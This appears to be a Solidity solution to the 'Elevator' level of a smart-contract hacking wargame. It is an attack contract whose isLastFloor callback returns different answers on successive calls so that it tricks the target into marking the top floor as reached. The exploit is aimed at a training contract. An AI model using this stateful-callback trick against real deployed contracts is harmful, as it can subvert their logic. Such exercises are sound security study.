// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/Elevator.sol";

contract ElevatorAttack{
    uint a = 0;
    function isLastFloor(uint num) external returns(bool){
        if (num != a){
            a = num;
            return false;
        }else{
            return num == a;
        }
    }
    function att(address addr) public {
        Elevator(addr).goTo(1);
    }
}